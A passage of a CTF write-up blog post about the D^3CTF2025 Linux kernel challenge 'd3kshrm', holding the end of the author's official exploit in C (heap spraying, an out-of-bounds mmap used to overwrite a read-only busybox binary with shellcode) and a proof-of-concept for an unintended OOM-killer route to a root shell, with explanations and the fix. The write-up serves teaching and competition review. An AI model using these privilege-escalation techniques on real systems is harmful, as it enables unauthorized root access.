class="line">    free_page((PAGE8_SPRAY_NR / <span class="number">2</span>) + <span class="number">1</span>);</span><br><span class="line">    destroy_pgv_socket((PAGE8_SPRAY_NR / <span class="number">2</span>) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; D3KSHRM_SPRAY_NR; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((d3kshrm_idx[i] = d3kshrm_create(d3kshrm_fd[i], PBF_SZ_PAGE_NR))&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            perror(ERROR_MSG(<span class="string">&quot;Failed to create D3KSHRM shared memory&quot;</span>));</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to spray D3KSHRM shared memory.\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;[*] Expanding pipe_buffer...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    free_page(PAGE8_SPRAY_NR / <span class="number">2</span>);</span><br><span class="line">    destroy_pgv_socket(PAGE8_SPRAY_NR / <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (expand_pipe(pipe_fd1, <span class="number">0x1000</span> * <span class="number">64</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(ERROR_MSG(<span class="string">&quot;Failed to expand pipe_buffer&quot;</span>));</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to expand first part of pipes.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;[*] Expanding pipe_buffer...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    free_page((PAGE8_SPRAY_NR / <span class="number">2</span>) + <span class="number">2</span>);</span><br><span class="line">    destroy_pgv_socket((PAGE8_SPRAY_NR / <span class="number">2</span>) + <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (expand_pipe(pipe_fd2, <span class="number">0x1000</span> * <span class="number">64</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(ERROR_MSG(<span class="string">&quot;Failed to expand pipe_buffer&quot;</span>));</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to expand second part of pipes.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;[*] Splicing victim file into pipe group...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (splice_pipe(pipe_fd1, victim_fd) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(ERROR_MSG(<span class="string">&quot;Failed to splice target fd&quot;</span>));</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to splice victim file into pipe_fd1 group.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (splice_pipe(pipe_fd2, victim_fd) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(ERROR_MSG(<span class="string">&quot;Failed to splice target fd&quot;</span>));</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to splice victim file into pipe_fd2 group.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;[*] Doing mmap and mremap...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = D3KSHRM_SLUB_OBJ_NR; i &lt; D3KSHRM_SPRAY_NR; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (d3kshrm_select(d3kshrm_fd[i], d3kshrm_idx[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(ERROR_MSG(<span class="string">&quot;Failed to select D3KSHRM shared memory&quot;</span>));</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to select D3KSHRM shared memory.\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        oob_buf[i] = mmap(</span><br><span class="line">            <span class="literal">NULL</span>,</span><br><span class="line">            <span class="number">0x1000</span> * PBF_SZ_PAGE_NR,</span><br><span class="line">            PROT_READ | PROT_WRITE,</span><br><span class="line">            MAP_FILE | MAP_SHARED,</span><br><span class="line">            d3kshrm_fd[i],</span><br><span class="line">            <span class="number">0</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (oob_buf[i] == MAP_FAILED) &#123;</span><br><span class="line">            perror(ERROR_MSG(<span class="string">&quot;Failed to map chal_fd&quot;</span>));</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to mmap chal_fd.\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        oob_buf[i] = mremap(</span><br><span class="line">            oob_buf[i],</span><br><span class="line">            <span class="number">0x1000</span> * PBF_SZ_PAGE_NR,</span><br><span class="line">            <span class="number">0x1000</span> * (PBF_SZ_PAGE_NR + <span class="number">1</span>),</span><br><span class="line">            MREMAP_MAYMOVE</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (oob_buf[i] == MAP_FAILED) &#123;</span><br><span class="line">            perror(ERROR_MSG(<span class="string">&quot;Failed to mremap oob_buf area&quot;</span>));</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to mremap chal&#x27;s mmap area.\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;[*] Checking for oob mapping...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    victim_buf = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = D3KSHRM_SLUB_OBJ_NR; i &lt; D3KSHRM_SPRAY_NR; i++) &#123;</span><br><span class="line">        <span class="comment">/* Examine ELF header to see whether we hit the busybox */</span></span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">size_t</span>*) &amp;oob_buf[i][<span class="number">0x1000</span>*PBF_SZ_PAGE_NR] == <span class="number">0x3010102464c457f</span>)&#123;</span><br><span class="line">            victim_buf = (<span class="type">void</span>*) &amp;oob_buf[i][<span class="number">0x1000</span>*PBF_SZ_PAGE_NR];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!victim_buf) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to oob mmap pages in pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;[*] Abusing OOB mmap to overwrite read-only file...&quot;</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(victim_buf, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">    log_success(<span class="string">&quot;[+] Just enjoy :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">banner</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(SUCCESS_MSG(<span class="string">&quot;-------- D^3CTF2025::Pwn - d3kshrm --------&quot;</span>) <span class="string">&quot;\n&quot;</span></span><br><span class="line">    INFO_MSG(<span class="string">&quot;--------    Official Exploitation   --------\n&quot;</span>)</span><br><span class="line">    INFO_MSG(<span class="string">&quot;--------      Author: &quot;</span>)<span class="string">&quot;arttnba3&quot;</span>INFO_MSG(<span class="string">&quot;      --------&quot;</span>) <span class="string">&quot;\n&quot;</span></span><br><span class="line">    SUCCESS_MSG(<span class="string">&quot;-------- Local Privilege Escalation --------\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    banner();</span><br><span class="line">    exploit();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Unintended-Solution"><a href="#Unintended-Solution" class="headerlink" title="Unintended Solution"></a>Unintended Solution</h2><p>I’m so sorry that I didn’t configure the file system well, which have caused an unintended solution as a result. Before we start I’d like to thank <a target="_blank" rel="noopener" href="https://9anux.org/2025/06/02/d3kshrm/">Qanux</a> from <a target="_blank" rel="noopener" href="https://wm-team.cn/">W&amp;M</a> who has found this issue by chance. To be honest the reason why unintended solution could be happened is that <strong>I configured the file system too normally.</strong></p>
<p>A minimal proof-of-concept function to <strong>stably</strong> trigger the unintended solution <strong>without the challenge kernel module</strong> is as follow (for helper functions like <code>prepare_pgv_system()</code> and <code>alloc_page()</code> please refer to the <code>exp.c</code>):</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">unintended_exploit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> errno;</span><br><span class="line">    prepare_pgv_system();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((errno = create_pgv_socket(i)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(ERROR_MSG(<span class="string">&quot;[x] Failed to allocate socket: &quot;</span>) <span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to allocate socket!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((errno = alloc_page(i, <span class="number">0x1000</span> * <span class="number">64</span>, <span class="number">64</span>)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(ERROR_MSG(<span class="string">&quot;[x] Failed to alloc pages on socket: &quot;</span>)<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to allocate pages!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] No.%d times\n&quot;</span>, i);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>While executing the proof-of-concept, we can notice that our process just terminated suddenly. Then we just got a root shell with no reasons:</p>
<p><img src="https://s2.loli.net/2025/06/03/YIoRTKiwm8bCe19.png" alt="image.png"></p>
<p><strong>How and why?</strong> To figure out what is happening during this procedure, let’s take a brief look at our proof-of-concept, who just simply <strong>keeps doing the memory allocation</strong> via the <code>setsockopt()</code> of <code>packet socket</code>. We all know that if the memory of a process keeps growing and occupies too much memory, there will be no enough available free memory for the system to use, thus the <a target="_blank" rel="noopener" href="https://www.kernel.org/doc/gorman/html/understand/understand016.html">OOM Killer</a> will be waken up to see whether the system have to kill a process for reclaiming its memory back. </p>
<p>Which process will be chosen to be killed? As we know that there are only several user land processes running in the environment, there is no doubt that the one to be possible to be killed can only comes from <code>rcS</code> , <code>sh</code>, and <code>exploit</code> . But who will be the guy to be chosen as the unlucky sheep? Well, the  <a target="_blank" rel="noopener" href="https://www.kernel.org/doc/gorman/html/understand/understand016.html">OOM Killer</a> determines the victim target depending on multiple factors including the resource consumption, and we can check that by examining the <code>/proc/[pid]/oom_score</code> . The result we need is as follow (reading by a simple C function):</p>
<p><img src="https://s2.loli.net/2025/06/04/x7Vgjsch31p9XRm.png" alt="image.png"></p>
<p>As we can see that the <code>rcS</code> and <code>sh</code> have the same OOM scores, the unlucky guy will be one of them as the <code>exploit</code> has a lower score. And as the <code>rcS</code> is a root process while <code>sh</code> is not, it seems that killing the <code>sh</code> does make sense? The answer is <strong>YES, BUT NOT ONLY YES</strong>. Let us see what really happened:</p>
<p><img src="https://s2.loli.net/2025/06/04/gerH8pOMsDUf2uy.png"></p>
<p><strong>ALL OF THEM ARE KILLED for reclaiming the memory!</strong> But why? An important reason is that after killing one specific victim process, there may still not be enough spare memory to be allocated. This may due to the asynchronous memory reclaiming, memory fragments and so on. What is more is that <em>we are keeping doing the memory allocation.</em> Therefore the OOM killer was invoked for multiple times (even if in one allocation procedure), killed the <code>sh</code> and <code>rcS</code> according to its high <code>oom_score</code> and orderd by privilege, and finally killed the <code>exploit</code> in the end.</p>
<p><strong>What will happen if all these processes are killed?</strong> As the <code>ttyS0</code> was occupied by these processes and finally get free at the moment, the <code>init</code> will re-get its control and detect that it’s free now. Note that our initialization system is using the <code>busybox-init</code>, as we can see that the <code>/sbin/init</code> is a symbol link to the <code>busybox</code>. The <code>busybox-init</code> will use the <code>/etc/inittab</code> as its configuration file, so let’s see what I’ve written in this file at a very long time ago, which is referred to the <a target="_blank" rel="noopener" href="https://git.busybox.net/busybox/tree/examples/inittab?h=1_37_stable">official example from the busybox</a>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::askfirst:/bin/ash</span><br><span class="line">::ctrlaltdel:/sbin/reboot</span><br><span class="line">::shutdown:/sbin/swapoff -a</span><br><span class="line">::shutdown:/bin/umount -a -r</span><br><span class="line">::restart:/sbin/init</span><br></pre></td></tr></table></figure>

<p>Let’s take a look at <code>::askfirst:</code> option whose value points to the <code>/bin/ash</code>. What is that and in what condition it will be executed? <strong>When there is no process running on the TTY, the program specified by the askfirst option will be executed by the &#x2F;sbin&#x2F;init with root privilege</strong> (just like <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Getty_(software)">getty</a>). </p>
<p>Therefore we can get to know the reason why we can get a root shell: At the very beginning the <code>/etc/init.d/rcS</code> is running on the <code>ttyS0</code> and spawn a user shell for us to interact. When we try to do the unlimited memory allocation in kernel space to occupy almost all the free memory, the <a target="_blank" rel="noopener" href="https://www.kernel.org/doc/gorman/html/understand/understand016.html">OOM Killer</a> will be waken up to kill the <code>/etc/init.d/rcS</code> . As there is no process running on the <code>ttyS0</code>, <strong>the &#x2F;bin&#x2F;ash specified by ::askfirst: in will be executed to provide us with a root shell</strong>.</p>
<p>That is also how  <a target="_blank" rel="noopener" href="https://9anux.org/2025/06/02/d3kshrm/">Qanux</a> from <a target="_blank" rel="noopener" href="https://wm-team.cn/">W&amp;M</a> solved the <code>d3kshrm</code> by accident: he just do the memory allocation directly from functionalities provided by the <code>d3kshrm.ko</code> , and due to my misconfiguration and wrong design, the expected allocatable memory is much larger than the memory of the virtual machine. Therefore the OOM killer was waken multiple times to kill all the user land processes except for <code>init</code>. After that the <code>ttyS0</code> goes idle again the <code>busybox-init</code> just throw a root shell out directly to the <code>ttyS0</code> he used. </p>
<p>Hence, here comes another question: <strong>Can we just simply do the memory allocation directly instead of directly exploit the memory-allocation APIs in the kernel?</strong> The answer is almost definitely <strong>NO</strong>. An important reason is that if we allocate memory directly into our process (like doing tons of <code>malloc()</code> to expand your heap segment), <strong>our OOM score will grow as well, and we will always be the first one to be killed.</strong> As we were killed, the memory allocation will stop and no need to invoke OOM killer to kill anyone else.</p>
<p>When I got this report during the competition, I quickly realized that this must be caused by the OOM killer after reviewing pictures provided by the player. What I didn’t expect is that everyone including the <code>rcS</code> will be killed as it never happened in any of CTF challenges I made before. My old expectation is that the kernel will panic due to the OOM, and the result told me that kernel does not always panic (lol the kernel is afraid of dying as well?). The report from the player who discovered this unintended solution says that his successful rate is at least <code>30%</code>. However, the POC I wrote above is beyond <code>99%</code>, I think this may be caused by the different API we called. As the <code>packet_set_ring()</code> calls the <code>vzalloc_noprof()</code>, it does only requires the kernel to allocate the memory region that is continuous only required on the virtual memory, which means that it can split the memory allocation from high-order one to low-order ones. However the function in <code>d3kshrm.ko</code> just calls the <code>alloc_pages()</code> to allocate high-order memory directly, thus the kernel will be more easy to get panic as we may not be able to reclaim required continuous high-order  physical memory.</p>
<p>How I finally fix that? I create a revenge version of this challenge, with the <code>/etc/inittab</code> modified. I changed the <code>::askfirst:</code> from <code>/bin/ash</code> to <code>/sbin/poweroff</code> to fix this unexpected vulnerability temporarily. But I think a better version might be changing that to the <code>login</code> ? Anyway this had taught me a lesson: <strong>a well-crafted environment might not be the most suitable one</strong>, and I should always <strong>double check everything in the environment</strong>.</p>
<h2 id="What’s-more…-1"><a href="#What’s-more…-1" class="headerlink" title="What’s more…"></a>What’s more…</h2><p>The introduction and the flag is modified from one of <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=0Kio3t3nXJo">my favourite advertisement created by the Halo Top</a>. Although this video might just be created for fun, but it does give me some special feelings that I can’t describe simply with words. So I chose that as the base and modified a lot to give you some meaningless sentences as the introduction and the flag : )</p>
<p>My innovation of creating this challenge comes from the <a target="_blank" rel="noopener" href="https://github.com/arttnba3/Linux-kernel-exploitation/tree/main/CVE/CVE-2023-2008">CVE-2023-2008</a> whose vulnerability is also the out-of-bound memory mapping. So to be honest it is not a pwn challenge that is hard and creative enough as my expectation and I’m so sorry about that because I’m always wanting to show you something cool and hadn’t present anything that is really cool this time. </p>
<p>An important reason why I chose to modified an existed vulnerability is that <em>I did not have too much time on completing these challenges.</em> As I’ve graduated from my undergraduate, I did not pay too much attention on how my junior schoolmates prepared for this year’s D^3CTF, and get to know that almost no pwn challenges were created <strong>just at about 10 days before the competition started</strong> . Therefore I have to stand out to rush to create the pwn challenges with almost nothing new in research in my mind to make sure the competition can be held normally as past years. <strong>Sorry and I apologize that I didn’t bring something that is as same cool as the d3kcache in 2023.</strong> </p>
<p>And if you pay enough attention to the kernel module itself, you may notice that I’ve wrote another unexpected vulnerability in calculating the reference count of the <code>vm_area</code>: I FORGOT TO WRITE THE <code>vm_open()</code> TO ADD COUNT BUT HAD REMEMBER TO WRITE THE <code>vm_close()</code> TO DEC COUNT! This had made confusion for many of players and made them waste lots of time on trying to exploit that, and to be honest it’s not easy to exploit as the page is hard to be use as both the user-land mapping page and SLUB page (but if you’re interested enough, maybe you can check for the <a target="_blank" rel="noopener" href="https://github.com/arttnba3/Linux-kernel-exploitation/tree/main/CVE/CVE-2024-0582">CVE-2024-0582</a> which is in a similar situation, but I’m not sure whether it also works for the <code>d3kshrm</code> so good luck). I’m sincerely sorry about that because this challenge is also a rush-made one so I didn’t check that too well. </p>
<p>For the whole competition, only the player <code>Tplus</code> from the <a target="_blank" rel="noopener" href="https://ctftime.org/team/19208/">MNGA</a> team had solved that with the expected solution. CONGRATULATIONS FOR HIM WHO IS THE ONLY ONE SOLVE THAT DURING THE COMPETITION! And <a target="_blank" rel="noopener" href="https://9anux.org/2025/06/02/d3kshrm/">Qanux</a> from <a target="_blank" rel="noopener" href="https://wm-team.cn/">W&amp;M</a> also succeeded to exploit that with expected solution after the competition ended (because he didn’t predict the <code>-revenge</code> version would be created for fixing and went out for a big big meal after solved with unintended solution). Anyway I think we should all clap and cheer for them.</p>
<p>And another interesting point all of you may ignore is that <strong>new SLUB pages will be allocated during the kmem_cache is being created,</strong> which means that our heap fengshui will always need to be focusing on the <strong>NEXT NEW ALLOCATED SLUB PAGES</strong>. I think that is the core reason why both <code>Tplus</code> and <code>Qanux</code> have a low successful rate in their exploitation as this key point is missing: they’re focusing on the first SLUB while my official solution is focusing on the second one. Therefore my successful rate to exploit with page-level heap fengshui is beyond <code>80%</code> and almost no need to try multiple times while attacking the remote.</p>
<p>Though I still have many thoughts about the Linux kernel exploitation, but it seems that this passage has become too long at this moment, so let’s just stop here. Anyway I would like to thank everyone who has participated in this CTF and has tried to solve my challenge, no matter you’ve got the flag or not. I’m still so sorry that I did not present you with something as cool as the <a target="_blank" rel="noopener" href="https://github.com/arttnba3/D3CTF2023_d3kcache">d3kcache</a> due to multiple reasons including limited time, hope that you will not mind : )</p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>arttnba3</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="http://blog.arttnba3.cn/2025/06/04/CTF-0X0A_D3CTF2025_D3KSHRM_D3KHEAP2/">http://blog.arttnba3.cn/2025/06/04/CTF-0X0A_D3CTF2025_D3KSHRM_D3KHEAP2/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2025 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/Pwn/"># Pwn</a>
                    
                        <a href="/tags/Linux/"># Linux</a>
                    
                        <a href="/tags/D-3CTF/"># D^3CTF</a>
                    
                        <a href="/tags/CTF/"># CTF</a>
                    
                        <a href="/tags/Linux-Kernel/"># Linux Kernel</a>
                    
                        <a href="/tags/Heap-Overflow/"># Heap Overflow</a>
                    
                        <a href="/tags/Cross-Cache-Overflow/"># Cross-Cache Overflow</a>
                    
                        <a href="/tags/Page-level-Heap-Fengshui/"># Page-level Heap Fengshui</a>
                    
                        <a href="/tags/Privilege-Escalation/"># Privilege Escalation</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
            
            <a class="next" rel="next" href="/2025/02/22/CVE-0X0C-CVE-2024-0582/">[CVE.0x0C] Analysis and Exploitation of CVE-2024-0582</a>
            
        </section>


    </article>
</div>

            </div>
            

<footer id="footer" class="footer">
    <div class="copyright">
        <span>
            © 2019 - 2025 arttnba3 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a>
        </span>
    </div>
</footer>

    </div>
</body>

</html>